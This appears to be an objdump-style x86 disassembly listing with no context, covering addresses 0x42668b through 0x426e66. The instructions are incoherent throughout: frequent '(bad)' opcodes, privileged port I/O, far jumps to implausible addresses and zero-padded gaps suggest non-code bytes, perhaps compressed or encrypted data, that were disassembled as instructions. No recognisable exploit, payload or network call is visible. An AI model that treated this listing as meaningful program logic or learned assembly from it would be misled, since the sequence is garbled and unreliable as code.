  42668b:	in     eax,dx
  42668c:	adc    al,0x2b
  42668e:	mov    bh,0x59
  426690:	cld    
  426691:	je     0x4266b0
  426693:	les    ecx,FWORD PTR [eax+0x59]
  426696:	rol    esp,1
  426698:	das    
  426699:	fnstenv [edx+0x73f76e5d]
  42669f:	in     al,dx
  4266a0:	pop    edx
  4266a1:	jp     0x4266c0
  4266a3:	out    dx,eax
  4266a4:	cwde   
  4266a5:	test   eax,0x50ecc56a
  4266aa:	fs sub al,0x2f
  4266ad:	fcom   QWORD PTR [eax]
  4266af:	sar    DWORD PTR [edx-0x745de9a5],1
  4266b5:	dec    BYTE PTR [ebp+0x42]
  4266b8:	jge    0x4266d4
  4266ba:	into   
  4266bb:	(bad)  
  4266bc:	pop    esp
  4266bd:	adc    ebp,edx
  4266bf:	pop    eax
  4266c0:	inc    ebp
  4266c1:	sub    ebp,DWORD PTR [eax]
  4266c3:	es mov esi,0x7b71e5b5
  4266c9:	and    edx,DWORD PTR [edx-0x5b]
  4266cc:	and    eax,DWORD PTR [ebx+0x7ef37960]
  4266d2:	jl     0x4266a9
  4266d4:	jl     0x426716
  4266d6:	add    esp,DWORD PTR [ecx-0x10df4a2e]
  4266dc:	ds jbe 0x426734
  4266df:	push   esp
  4266e0:	push   cs
  4266e1:	lea    esi,[esi]
  4266e3:	pop    ebx
  4266e4:	or     ebp,edi
  4266e6:	fwait
  4266e7:	jb     0x42666b
  4266e9:	sub    al,0x66
  4266eb:	pop    edx
  4266ec:	mov    cl,0xaf
  4266ee:	(bad)  
  4266ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266f0:	pop    esi
  4266f1:	or     ah,BYTE PTR [ecx+0x403ad243]
  4266f7:	jecxz  0x426745
  4266f9:	dec    edx
  4266fa:	iret   
  4266fb:	jne    0x426719
  4266fd:	xlat   BYTE PTR ds:[ebx]
  4266fe:	pop    ecx
  4266ff:	ins    BYTE PTR es:[edi],dx
  426700:	aad    0xfe
  426702:	mov    al,0xdf
  426704:	mov    edi,0xc0eb9e0b
  426709:	pop    eax
  42670a:	add    ebp,edi
  42670c:	mov    ah,BYTE PTR [esi-0x15]
  42670f:	ret    0x96d2
  426712:	jg     0x426749
  426714:	outs   dx,BYTE PTR ds:[esi]
  426715:	es push ds
  426717:	mul    DWORD PTR [eax+ebp*1+0x6802fc5f]
  42671e:	pop    esp
  42671f:	mov    ds:0x7ccdcb0d,eax
  426724:	(bad)  
  426726:	adc    eax,0xf175a5c
  42672b:	jge    0x42679f
  42672d:	out    0xe5,eax
  42672f:	sahf   
  426730:	sbb    BYTE PTR [ebp-0x4f382bbf],dl
  426736:	push   edx
  426738:	jmp    0xda66e351
  42673d:	xchg   ebp,eax
  42673e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42673f:	mov    esi,0x48e5ab8
  426744:	jb     0x4267c3
  426746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426747:	inc    edi
  426748:	fdivr  QWORD PTR [edx]
  42674a:	lahf   
  42674b:	push   ss
  42674c:	enter  0x4932,0xd6
  426750:	aas    
  426751:	out    0x13,eax
  426753:	fadd   DWORD PTR [edx]
  426755:	mov    DWORD PTR [eax],eax
  426757:	mov    edx,0x61d7ae69
  42675c:	cmp    al,0xed
  42675e:	adc    edx,DWORD PTR [edi-0x8]
  426761:	sbb    BYTE PTR [eax],ch
  426763:	sti    
  426764:	adc    DWORD PTR [edi+0x6cec8b93],edx
  42676a:	out    dx,al
  42676b:	jmp    0x83b:0x6f42c41
  426772:	lahf   
  426773:	inc    esp
  426774:	(bad)  
  426775:	sub    BYTE PTR [edx+0x50],al
  426778:	or     DWORD PTR [ebx+ecx*4+0x37d992e9],eax
  42677f:	rcl    DWORD PTR [ecx-0x7fc1614b],1
  426785:	sti    
  426786:	sub    esp,DWORD PTR [ebp-0x79]
  426789:	add    esi,esi
  42678b:	push   0xffffffa2
  42678d:	idiv   DWORD PTR [eax+edi*4+0x45]
  426791:	push   ds
  426792:	rcr    esp,0x93
  426795:	inc    ecx
  426796:	mov    dh,0x47
  426798:	jecxz  0x4267f5
  42679a:	nop
  42679b:	push   ebx
  42679c:	clc    
  42679d:	in     eax,0x96
  42679f:	(bad)  
  4267a0:	loope  0x4267c8
  4267a2:	sti    
  4267a3:	mov    ebp,0xe7a4cc42
  4267a8:	inc    eax
  4267a9:	xchg   BYTE PTR [edx],al
  4267ab:	test   al,0x9a
  4267ad:	leave  
  4267ae:	mov    esi,0x0
  4267b3:	add    BYTE PTR [eax],al
  4267b5:	add    BYTE PTR [eax],al
  4267b7:	add    BYTE PTR [eax],al
  4267b9:	add    BYTE PTR [eax-0x57e1776],dh
  4267bf:	jecxz  0x4267ba
  4267c1:	mov    ebx,0xcae72888
  4267c6:	enter  0x7d2f,0x7f
  4267ca:	jle    0x4267aa
  4267cc:	add    DWORD PTR [eax],eax
  4267ce:	std    
  4267cf:	add    DWORD PTR [eax],eax
  4267d1:	add    BYTE PTR [ebp-0x532655a],cl
  4267d7:	fld    TBYTE PTR [ecx]
  4267d9:	iret   
  4267da:	inc    al
  4267dc:	cli    
  4267dd:	push   edx
  4267de:	jne    0x4267a7
  4267e0:	stc    
  4267e1:	in     eax,dx
  4267e2:	inc    esi
  4267e3:	mov    ebx,db3
  4267e6:	xor    dl,ah
  4267e8:	stos   BYTE PTR es:[edi],al
  4267e9:	add    eax,0x2dce24e3
  4267ee:	jge    0x426779
  4267f0:	jb     0x426804
  4267f2:	aad    0x8b
  4267f4:	adc    ecx,ebx
  4267f6:	cmp    BYTE PTR [ebx-0x3fed4cde],dl
  4267fc:	bound  esi,QWORD PTR [esi+0xd66ab9c]
  426802:	js     0x4267c3
  426804:	cmp    eax,edx
  426806:	shr    DWORD PTR [ebx+0xdb3aa63],1
  42680c:	imul   DWORD PTR [edx-0x61]
  42680f:	cmp    esp,esp
  426811:	or     al,0xbd
  426813:	add    DWORD PTR [ebp-0x3e],ebp
  426816:	outs   dx,BYTE PTR ds:[esi]
  426817:	push   ss
  426818:	add    ebx,DWORD PTR ds:0xeef91482
  42681e:	xor    al,0x1c
  426820:	and    edi,DWORD PTR [edx-0x6b]
  426823:	fisttp WORD PTR [edx+0x794f001c]
  426829:	enter  0xeedc,0x6a
  42682d:	cdq    
  42682e:	push   esp
  42682f:	ins    DWORD PTR es:[edi],dx
  426830:	bound  ecx,QWORD PTR ds:0x93ff55b7
  426836:	sub    dl,BYTE PTR [eax-0x6e68b6e1]
  42683c:	fbstp  TBYTE PTR [ecx]
  42683e:	sbb    eax,0x811623e1
  426843:	or     eax,0xc431bdae
  426848:	xor    al,0xe6
  42684a:	xor    al,0xa9
  42684c:	popf   
  42684d:	(bad)  
  42684e:	xchg   esp,eax
  42684f:	jmp    FWORD PTR ds:0x3644ae7f
  426855:	add    al,0xab
  426857:	or     al,0x9d
  426859:	xchg   esi,ebp
  42685b:	inc    edx
  42685c:	in     al,0x71
  42685e:	mov    ecx,0x1a31119e
  426863:	dec    ebp
  426864:	cmovle eax,DWORD PTR [esi-0x4d]
  426868:	imul   esp,DWORD PTR [ebp+0xb],0xffffffbb
  42686c:	mov    ?,WORD PTR [eax]
  42686e:	push   es
  42686f:	shl    BYTE PTR [eax+0x4ae264df],cl
  426875:	loopne 0x4267fe
  426877:	sub    al,0xf3
  426879:	jne    0x42680d
  42687b:	cli    
  42687c:	inc    esp
  42687d:	jmp    0x4268b0
  42687f:	and    esi,DWORD PTR [esi+0x31a97343]
  426885:	fidivr DWORD PTR [eax-0x58]
  426888:	adc    bh,0xac
  42688b:	leave  
  42688c:	xchg   BYTE PTR [ebp-0x6557f9c1],bl
  426892:	push   edi
  426893:	mov    ?,WORD PTR cs:[ecx]
  426896:	cmp    BYTE PTR [eax],ah
  426898:	jp     0x42685e
  42689a:	mov    bh,0x9
  42689c:	sub    bl,BYTE PTR [edi]
  42689e:	stos   BYTE PTR es:[edi],al
  42689f:	mov    esp,0xf4eb3853
  4268a4:	test   eax,0x6b744b0f
  4268a9:	inc    ecx
  4268aa:	(bad)  
  4268ab:	mov    esi,0x46709edc
  4268b0:	fidivr DWORD PTR [ecx-0x7b]
  4268b3:	cmp    al,0xba
  4268b5:	out    dx,eax
  4268b6:	dec    edx
  4268b7:	xchg   DWORD PTR [ebp+0x4e199bdf],ebx
  4268bd:	mov    esi,0xa5c7b61e
  4268c2:	sub    ebp,DWORD PTR [esi+0x249a8334]
  4268c8:	test   eax,0xd0eea036
  4268cd:	sbb    BYTE PTR [eax-0x79],dl
  4268d0:	add    al,0xc7
  4268d2:	(bad)  
  4268d3:	mov    eax,cr6
  4268d6:	int3   
  4268d7:	jbe    0x42686a
  4268d9:	fsubr  st,st(3)
  4268db:	push   esi
  4268dc:	push   edi
  4268dd:	mov    bh,0xa8
  4268df:	or     dl,BYTE PTR [ecx+eax*4-0x73]
  4268e3:	add    ah,BYTE PTR [ebx]
  4268e5:	adc    DWORD PTR [edx+0x10],ebx
  4268e8:	pop    edi
  4268e9:	ds mov ch,0x5d
  4268ec:	fcomp  QWORD PTR [esi]
  4268ee:	or     bh,BYTE PTR [eax-0x41]
  4268f1:	sub    ah,bl
  4268f3:	or     al,0x4
  4268f5:	dec    ebp
  4268f6:	jae    0x4268f7
  4268f8:	mov    dh,0x42
  4268fa:	xor    BYTE PTR [edi+0x2e],cl
  4268fd:	gs pop esp
  4268ff:	out    dx,eax
  426900:	ret    
  426901:	sbb    al,0x69
  426903:	adc    eax,0x39e08de8
  426908:	pushf  
  426909:	push   ss
  42690a:	jnp    0x42694b
  42690c:	push   ebx
  42690d:	mov    eax,0x68535762
  426912:	cmp    BYTE PTR [edx-0x575d8953],dh
  426918:	mov    ch,0x37
  42691a:	nop
  42691b:	push   ecx
  42691c:	pop    esp
  42691d:	cld    
  42691e:	sbb    al,0x65
  426920:	xchg   edx,eax
  426921:	xchg   esi,eax
  426922:	(bad)
  426926:	std    
  426927:	mov    edi,0x50c99005
  42692c:	fadd   DWORD PTR [ebp+0x4ea6ce69]
  426932:	js     0x4268e2
  426934:	ret    0x5660
  426937:	and    eax,0x7cf2e1a5
  42693c:	test   BYTE PTR [edx+0x7d],bh
  42693f:	mov    bl,0x4
  426941:	inc    eax
  426942:	sbb    BYTE PTR [ebp+0x44aa9d6e],bl
  426948:	or     al,0xd5
  42694a:	out    dx,al
  42694b:	repnz cmp ah,BYTE PTR [edi-0x5347baea]
  426952:	aaa    
  426953:	gs (bad) 
  426955:	jmp    0x426934
  426957:	fadd   st,st(5)
  426959:	rol    al,cl
  42695b:	cwde   
  42695c:	neg    BYTE PTR [ebx]
  42695e:	or     al,0x4d
  426960:	retf   
  426961:	sub    DWORD PTR [ecx+0x3c],eax
  426964:	push   esi
  426965:	xor    eax,DWORD PTR [edi+0x75]
  426968:	leave  
  426969:	add    al,0x9
  42696b:	(bad)  
  42696c:	fist   WORD PTR [eax+0x23caed9]
  426972:	lahf   
  426973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426974:	mov    BYTE PTR [edi],ch
  426976:	repnz push 0xffffffe1
  426979:	scas   al,BYTE PTR es:[edi]
  42697a:	xchg   DWORD PTR [ebp-0x6cbe7118],esi
  426980:	test   BYTE PTR [ebx+0x35db2b94],dh
  426986:	jno    0x42693b
  426988:	xchg   BYTE PTR [edx-0x5715c232],al
  42698e:	fsubr  DWORD PTR [esp+ebx*2+0x30]
  426992:	in     al,0x3e
  426994:	pop    eax
  426995:	push   0xffffff91
  426997:	icebp  
  426998:	lea    eax,[eax+0x7e]
  42699b:	add    esp,esp
  42699d:	les    eax,FWORD PTR [esp+edx*4+0x5f]
  4269a1:	std    
  4269a2:	cmc    
  4269a3:	mov    cl,0x9a
  4269a5:	xchg   ebx,eax
  4269a6:	shr    DWORD PTR [esi+ecx*8+0x1ade73d9],1
  4269ad:	xchg   ebp,eax
  4269ae:	add    al,0x91
  4269b0:	lahf   
  4269b1:	mov    cl,0x13
  4269b3:	mov    al,0x22
  4269b5:	mov    esi,0x8cd52318
  4269ba:	dec    eax
  4269bb:	and    bh,BYTE PTR [esi-0x56]
  4269be:	mov    ch,al
  4269c0:	jle    0x426a12
  4269c2:	in     eax,dx
  4269c3:	jg     0x426966
  4269c5:	repnz mov bl,0x86
  4269c8:	ficom  DWORD PTR [ebp-0x3abf1c01]
  4269ce:	inc    esi
	...
  4269d7:	add    BYTE PTR [eax],al
  4269d9:	add    BYTE PTR [edx-0x39253b74],cl
  4269df:	ficomp DWORD PTR [esi+0xc235fdc]
  4269e5:	mov    dl,dh
  4269e7:	shld   DWORD PTR [ebx],ecx,0x7b
  4269eb:	loopne 0x4269ee
  4269ed:	add    ch,bh
  4269ef:	add    DWORD PTR [eax],eax
  4269f1:	add    BYTE PTR [ebp-0x1b88b201],al
  4269f7:	and    esi,DWORD PTR [edi]
  4269f9:	mov    al,ds:0xc0c879bf
  4269fe:	inc    ecx
  4269ff:	pop    esi
  426a00:	int    0xee
  426a02:	loopne 0x426a6c
  426a04:	inc    edx
  426a05:	int3   
  426a06:	cld    
  426a07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a08:	xchg   edx,eax
  426a09:	xchg   edi,eax
  426a0a:	nop
  426a0b:	dec    ecx
  426a0c:	shl    esi,1
  426a0e:	push   eax
  426a0f:	xchg   esi,eax
  426a10:	(bad)  [esi+0x3107e08]
  426a16:	cs nop
  426a18:	aad    0x1e
  426a1a:	mov    esi,0xb70c532f
  426a1f:	(bad)  
  426a20:	mov    bl,0x99
  426a22:	retf   
  426a23:	xchg   edx,eax
  426a24:	push   DWORD PTR [ebx+0x59]
  426a27:	mov    eax,ds:0x7f9de0f8
  426a2c:	pop    edx
  426a2d:	mov    edi,0xf707abb0
  426a32:	out    0x8a,al
  426a34:	mov    dh,0x4
  426a36:	sub    DWORD PTR [esi-0x2b14d4d7],esi
  426a3c:	ds mov edx,ecx
  426a3f:	mov    DWORD PTR [edi],esi
  426a41:	je     0x426a2a
  426a43:	mov    esp,0xa554de32
  426a48:	mov    cl,0x4c
  426a4a:	inc    edi
  426a4b:	test   BYTE PTR [eax],al
  426a4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a4e:	mov    eax,ds:0x4116973e
  426a53:	stc    
  426a54:	cmp    edi,DWORD PTR [ebp+0x900de7a]
  426a5a:	push   0x24140b09
  426a5f:	jbe    0x426a7a
  426a61:	es mov ebx,0x56decf16
  426a67:	mov    dl,0xb
  426a69:	jae    0x426a33
  426a6b:	(bad)  
  426a6c:	bound  esp,QWORD PTR [edx-0x46]
  426a6f:	fdivp  st(1),st
  426a71:	aas    
  426a72:	sbb    ebx,DWORD PTR [ebx]
  426a74:	push   ds
  426a75:	dec    edi
  426a76:	pop    edi
  426a77:	ds and esp,esi
  426a7a:	push   ebx
  426a7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a7c:	sub    bh,BYTE PTR [ebx+0x5ff402ba]
  426a82:	xor    eax,eax
  426a84:	xor    bh,BYTE PTR [ecx+0x3572fb0]
  426a8a:	cmp    BYTE PTR [edi],cl
  426a8c:	into   
  426a8d:	and    ecx,ebp
  426a8f:	add    al,0xa7
  426a91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a92:	jge    0x426a55
  426a94:	pop    edi
  426a95:	ins    DWORD PTR es:[edi],dx
  426a96:	add    DWORD PTR [edx+0x2b],ecx
  426a99:	xor    eax,0x13e7e61b
  426a9e:	jns    0x426aca
  426aa0:	jg     0x426a4c
  426aa2:	(bad)  
  426aa3:	pop    ds
  426aa4:	addr16 icebp 
  426aa6:	mov    ebp,0x23afcf58
  426aab:	inc    edi
  426aac:	push   es
  426aad:	(bad)  
  426aae:	fadd   DWORD PTR [edx]
  426ab0:	sub    al,BYTE PTR [ebp-0x46602e1e]
  426ab6:	pop    ebx
  426ab7:	ficom  WORD PTR [ebp-0x3080217e]
  426abd:	es retf 
  426abf:	cmp    al,0x83
  426ac1:	aam    0x90
  426ac3:	test   BYTE PTR [ebx-0x2b],0xe8
  426ac7:	sbb    edi,DWORD PTR [eax]
  426ac9:	sub    eax,0x9cc7300f
  426ace:	push   ss
  426acf:	mov    DWORD PTR [ebx-0x70],ebx
  426ad2:	cli    
  426ad3:	push   edx
  426ad4:	rol    DWORD PTR [edi],0x68
  426ad7:	repnz ror DWORD PTR [edx+edx*4+0x1c],cl
  426adc:	lods   eax,DWORD PTR ds:[esi]
  426add:	loopne 0x426a8e
  426adf:	xor    BYTE PTR [esi+0x73],ch
  426ae2:	les    ecx,FWORD PTR [esp+eax*8+0x53ace244]
  426ae9:	jl     0x426b53
  426aeb:	mov    WORD PTR [edx+0x0],gs
  426aee:	push   0xffffffb9
  426af0:	test   eax,0xfd7528b0
  426af5:	sti    
  426af6:	pop    esi
  426af7:	nop
  426af8:	sbb    WORD PTR [esi+0x7e],0xcb7f
  426afe:	inc    esp
  426aff:	retf   
  426b00:	dec    ebx
  426b01:	inc    BYTE PTR [ebx+0x34f9cf43]
  426b07:	rcr    BYTE PTR [edx+ecx*8-0x6a],0xe9
  426b0c:	cld    
  426b0d:	mov    esi,eax
  426b0f:	popa   
  426b10:	outs   dx,DWORD PTR ds:[esi]
  426b11:	mov    edx,0xa1aadcea
  426b16:	shr    BYTE PTR [ecx+0x5dc46bbf],1
  426b1c:	mov    ah,0x5a
  426b1e:	push   ebx
  426b1f:	test   al,0x42
  426b21:	cmp    DWORD PTR [edi],0x27
  426b24:	mov    dl,0x20
  426b26:	jecxz  0x426b1c
  426b28:	jg     0x426b07
  426b2a:	or     al,0x9c
  426b2c:	or     DWORD PTR [edi+0x27ed045a],ebx
  426b32:	(bad)
  426b35:	mov    ecx,0xa37f0628
  426b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b3b:	pop    esi
  426b3c:	mov    ah,0x80
  426b3e:	les    esp,FWORD PTR [esi-0x1d8ac3cf]
  426b44:	mov    ch,0xd5
  426b46:	push   esp
  426b47:	jmp    0x426ae8
  426b49:	test   DWORD PTR [edi+edx*1+0x48c8b5a1],0xeb6da6f6
  426b54:	sar    BYTE PTR [ebx+0x23],cl
  426b57:	mov    eax,0xbdc15df9
  426b5c:	adc    al,0x89
  426b5e:	aad    0x90
  426b60:	or     al,0xf4
  426b62:	ffreep st(6)
  426b64:	jo     0x426ba6
  426b66:	iret   
  426b67:	xchg   edi,eax
  426b68:	je     0x426b17
  426b6a:	mov    eax,ds:0x26bc409f
  426b6f:	pop    esi
  426b70:	cmp    BYTE PTR [esi+eiz*1+0x12],ch
  426b74:	dec    edx
  426b75:	push   es
  426b76:	mov    ds:0x74094e4e,al
  426b7b:	mov    ds,esi
  426b7d:	add    ch,al
  426b7f:	nop
  426b80:	aad    0x98
  426b82:	pop    es
  426b83:	repnz push di
  426b86:	ret    0x86c9
  426b89:	xlat   BYTE PTR ds:[ebx]
  426b8a:	cmp    eax,0x1837b77d
  426b8f:	lods   al,BYTE PTR ds:[esi]
  426b90:	jp     0x426b54
  426b92:	mov    ah,0x7c
  426b94:	mov    al,0xb5
  426b96:	fs jmp 0x426c04
  426b99:	js     0x426c15
  426b9b:	std    
  426b9c:	shr    BYTE PTR [ebp-0x771e5bc0],cl
  426ba2:	sbb    edx,0x1d
  426ba5:	cwde   
  426ba6:	mov    esi,0x5dc3f390
  426bab:	test   eax,0x702226e8
  426bb0:	pop    ebp
  426bb1:	add    BYTE PTR [ecx+ebx*8+0x67],bh
  426bb5:	and    DWORD PTR [ecx+0x3dd6418b],edx
  426bbb:	(bad)  [edi+0x6098d8f1]
  426bc1:	pop    es
  426bc2:	xor    BYTE PTR [ecx],0x6a
  426bc5:	repnz mov WORD PTR [esi-0x5842a324],cs
  426bcc:	mov    edi,DWORD PTR [eax+0x7]
  426bcf:	push   ss
  426bd0:	or     eax,0xc3b822c4
  426bd5:	xor    BYTE PTR [esi],al
  426bd7:	retf   0x905c
  426bda:	call   DWORD PTR es:[ebx-0x550f3258]
  426be1:	pop    ds
  426be2:	js     0x426b75
  426be4:	call   0xe1c1e42c
  426be9:	mov    esp,edx
  426beb:	fwait
  426bec:	es jmp 0x426c77
	...
  426bfa:	inc    eax
  426bfb:	stos   BYTE PTR es:[edi],al
  426bfc:	pop    edx
  426bfd:	sbb    bh,dl
  426bff:	cli    
  426c00:	inc    eax
  426c01:	cli    
  426c02:	mov    ds:0x47fe433f,al
  426c07:	xchg   DWORD PTR [esi],eax
  426c09:	bound  edi,QWORD PTR [eax-0x1e]
  426c0c:	add    DWORD PTR [eax],eax
  426c0e:	std    
  426c0f:	add    DWORD PTR [eax],eax
  426c11:	add    ah,al
  426c13:	lock fdivp st(3),st
  426c16:	mov    WORD PTR [ecx+edx*1],fs
  426c19:	push   ss
  426c1a:	retf   0x956b
  426c1d:	lds    ecx,FWORD PTR [ecx+0x761a194e]
  426c23:	lahf   
  426c24:	outs   dx,BYTE PTR ds:[esi]
  426c25:	cmc    
  426c26:	jmp    0x7a03a25a
  426c2b:	dec    eax
  426c2c:	jb     0x426be0
  426c2e:	(bad)  
  426c2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c30:	les    edx,FWORD PTR [edi+edx*2+0x44ea0ead]
  426c37:	pop    esi
  426c38:	sbb    DWORD PTR [ebx+0x2f],ebx
  426c3b:	stos   BYTE PTR es:[edi],al
  426c3c:	fst    st(1)
  426c3e:	fnstenv [ecx]
  426c40:	mov    esp,0x38a09e89
  426c45:	(bad)  
  426c46:	test   al,0x45
  426c48:	push   edx
  426c49:	aas    
  426c4a:	adc    ecx,esp
  426c4c:	or     BYTE PTR [edx+eiz*8+0x39a0bc29],0x47
  426c54:	or     al,BYTE PTR [esi+0x67]
  426c57:	push   ebp
  426c58:	fstp   DWORD PTR [eax-0x7e8d4ba0]
  426c5e:	nop
  426c5f:	aaa    
  426c60:	pusha  
  426c61:	add    BYTE PTR [eax-0x1d],ch
  426c64:	jae    0x426bf1
  426c66:	add    al,0x96
  426c68:	inc    esi
  426c69:	(bad)  
  426c6a:	and    BYTE PTR [ebp+edx*2-0x331cecc5],ch
  426c71:	outs   dx,BYTE PTR ds:[esi]
  426c72:	les    eax,FWORD PTR [ebp+0x39]
  426c75:	call   DWORD PTR [ebx+esi*2]
  426c78:	mov    ecx,0xc65bb108
  426c7d:	sbb    eax,DWORD PTR [ebx*2+0x1d9aeca3]
  426c84:	mov    WORD PTR [eax+0x11],?
  426c87:	(bad)  
  426c89:	aad    0x90
  426c8b:	int3   
  426c8c:	mov    cl,dl
  426c8e:	repnz push 0xffffffa0
  426c91:	cmp    al,BYTE PTR [ebp-0x7a6a98dd]
  426c97:	add    al,0xbe
  426c99:	xchg   ecx,eax
  426c9a:	xor    DWORD PTR [esi+esi*1+0x1c0b1df3],0x54f3ef82
  426ca5:	repnz shr BYTE PTR [bp+si-0x3f],cl
  426caa:	pop    ebx
  426cab:	loop   0x426ca3
  426cad:	gs leave 
  426caf:	rol    dl,cl
  426cb1:	icebp  
  426cb2:	xchg   ebp,eax
  426cb3:	(bad)  
  426cb5:	xchg   ebx,eax
  426cb6:	jo     0x426c42
  426cb8:	mov    eax,0xbe168ff3
  426cbd:	inc    edi
  426cbe:	test   eax,0x4f69c05a
  426cc3:	lods   eax,DWORD PTR ds:[esi]
  426cc4:	xchg   edx,eax
  426cc5:	stos   BYTE PTR es:[edi],al
  426cc6:	dec    edx
  426cc7:	ret    
  426cc8:	(bad)  
  426cc9:	std    
  426cca:	(bad)  
  426ccc:	inc    ebp
  426ccd:	sub    eax,0x2d382537
  426cd2:	lock das 
  426cd4:	test   BYTE PTR [edx*1-0x765a63fa],0x5a
  426cdc:	add    DWORD PTR [ecx],edx
  426cde:	mov    dl,0x88
  426ce0:	dec    edi
  426ce1:	mov    ch,0x23
  426ce3:	xchg   ecx,eax
  426ce4:	or     DWORD PTR fs:[ebp-0x80],esi
  426ce8:	popa   
  426ce9:	sub    eax,DWORD PTR [eax-0x32]
  426cec:	xor    al,0x4c
  426cee:	maskmovq mm2,(bad)
  426cef:	not    DWORD PTR ds:0xee06bfc0
  426cf5:	leave  
  426cf6:	pop    edx
  426cf7:	inc    edi
  426cf8:	pop    ecx
  426cf9:	bound  edx,QWORD PTR [eax]
  426cfb:	add    eax,0x8724b63a
  426d00:	mov    ecx,0x4a0a8ad3
  426d05:	aam    0x67
  426d07:	cld    
  426d08:	sub    eax,0x861636a7
  426d0d:	es popa 
  426d0f:	add    ecx,ebp
  426d11:	call   0x4e7f:0xc8fb5da4
  426d18:	aas    
  426d19:	or     bl,BYTE PTR [ebx-0x34]
  426d1c:	mov    ecx,ecx
  426d1e:	sub    ebp,DWORD PTR [eax]
  426d20:	cli    
  426d21:	xchg   BYTE PTR [edi+ebx*2],dl
  426d24:	call   0xcb426c3a
  426d29:	mov    esp,0x2f8bba7f
  426d2e:	cmp    al,0xbb
  426d30:	mov    ecx,0xa31c9e56
  426d35:	icebp  
  426d36:	test   eax,0xa3c0240
  426d3b:	ins    DWORD PTR es:[edi],dx
  426d3c:	sbb    eax,0xafa9bda1
  426d41:	stc    
  426d42:	push   ebx
  426d43:	mov    dl,0xdb
  426d45:	sbb    ch,BYTE PTR [esi-0x256e7c13]
  426d4b:	mov    ebx,0x9d21c62b
  426d50:	(bad)  
  426d51:	fnstsw WORD PTR [ecx-0x1972dbe3]
  426d57:	push   di
  426d59:	fwait
  426d5a:	jo     0x426d6b
  426d5c:	xor    al,0x42
  426d5e:	sub    DWORD PTR [ebp+0x54],ecx
  426d61:	stos   BYTE PTR es:[edi],al
  426d62:	aas    
  426d63:	or     ch,BYTE PTR [ebp+0x43]
  426d66:	scas   eax,DWORD PTR es:[edi]
  426d67:	sbb    BYTE PTR [edi-0x2e],ch
  426d6a:	fidiv  WORD PTR [edi]
  426d6c:	iret   
  426d6d:	scas   eax,DWORD PTR es:[edi]
  426d6e:	mov    al,ds:0xc6cf3a94
  426d73:	je     0xce6fd025
  426d79:	xchg   ebx,eax
  426d7a:	xor    esp,esi
  426d7c:	mov    ?,WORD PTR [eax+0x46]
  426d7f:	(bad)  
  426d81:	dec    edi
  426d82:	push   esi
  426d83:	pop    ds
  426d84:	push   0xffffff80
  426d86:	(bad)  
  426d87:	jmp    0xf52d6b8a
  426d8c:	and    dl,BYTE PTR [eax]
  426d8e:	push   ss
  426d8f:	cmp    dl,BYTE PTR [esi+0x8c0a3b]
  426d95:	loopne 0x426dbb
  426d97:	mov    esp,DWORD PTR [edx+ebx*4-0x63907595]
  426d9e:	push   ebp
  426d9f:	mov    bh,0x50
  426da1:	adc    bl,al
  426da3:	(bad)  
  426da4:	into   
  426da5:	mov    WORD PTR ds:0xdf221311,es
  426dab:	imul   esp,esp,0xf933bf82
  426db1:	jp     0x426e29
  426db3:	dec    esp
  426db4:	test   BYTE PTR [edx-0x4b],dl
  426db7:	es mov ebp,0x654a35a1
  426dbd:	loopne 0x426e25
  426dbf:	outs   dx,BYTE PTR ds:[esi]
  426dc0:	test   al,0xbd
  426dc2:	out    0x8a,al
  426dc4:	adc    DWORD PTR [ebp-0x57],esp
  426dc7:	icebp  
  426dc8:	adc    DWORD PTR [ebp+0xa22bae1],eax
  426dce:	scas   al,BYTE PTR es:[edi]
  426dcf:	lods   eax,DWORD PTR ds:[esi]
  426dd0:	fiadd  WORD PTR [ebx-0x5e]
  426dd3:	lods   al,BYTE PTR ds:[esi]
  426dd4:	mov    edx,0x1ea6e7ec
  426dd9:	icebp  
  426dda:	imul   DWORD PTR [edi]
  426ddc:	arpl   WORD PTR [esi-0x7c9f241b],bx
  426de2:	scas   al,BYTE PTR es:[edi]
  426de3:	(bad)  
  426de4:	sub    DWORD PTR [eax+eiz*1+0x15],esi
  426de8:	dec    edx
  426de9:	or     al,BYTE PTR [ebx+0x1e]
  426dec:	push   esp
  426ded:	mov    ds:0x8f5db43f,eax
  426df2:	xchg   esp,eax
  426df3:	xchg   edi,eax
  426df4:	jg     0x426e51
  426df6:	add    al,0x98
  426df8:	push   eax
  426df9:	sahf   
  426dfa:	scas   al,BYTE PTR es:[edi]
  426dfb:	mov    ecx,0xa7a5ed94
  426e00:	repz fdivr DWORD PTR [ecx]
  426e03:	sub    eax,0xa36c3e76
  426e08:	dec    ecx
  426e09:	mov    edi,0x92276d89
  426e0e:	add    DWORD PTR [eax],0x0
	...
  426e19:	add    BYTE PTR [esi-0x28ab281c],dh
  426e1f:	ja     0x426dd8
  426e21:	out    0x39,al
  426e23:	(bad)  
  426e24:	push   ebx
  426e25:	lahf   
  426e26:	inc    ecx
  426e27:	mov    eax,0xe475df92
  426e2c:	add    DWORD PTR [eax],eax
  426e2e:	std    
  426e2f:	add    DWORD PTR [eax],eax
  426e31:	add    BYTE PTR [esi+0x35],dl
  426e34:	scas   al,BYTE PTR es:[edi]
  426e35:	push   esi
  426e36:	adc    al,0x5c
  426e38:	add    al,0xa9
  426e3a:	rcr    BYTE PTR [edi+0x7],1
  426e3d:	adc    BYTE PTR [esp+eax*1-0x17],dh
  426e41:	aad    0x10
  426e43:	fisttp DWORD PTR [esi-0x4c]
  426e46:	outs   dx,DWORD PTR ds:[esi]
  426e47:	inc    ecx
  426e48:	adc    al,0x91
  426e4a:	and    al,0x98
  426e4c:	jo     0x426e9a
  426e4e:	aas    
  426e4f:	out    0x2d,al
  426e51:	adc    BYTE PTR [ecx-0x2433ca4a],0xfe
  426e58:	inc    esp
  426e59:	xchg   BYTE PTR [edx-0x71],dl
  426e5c:	cmc    
  426e5d:	ja     0x426dee
  426e5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e60:	cmp    eax,0xa0686b8d
  426e65:	pop    ecx
  426e66:	adc    eax,0xba3b8989
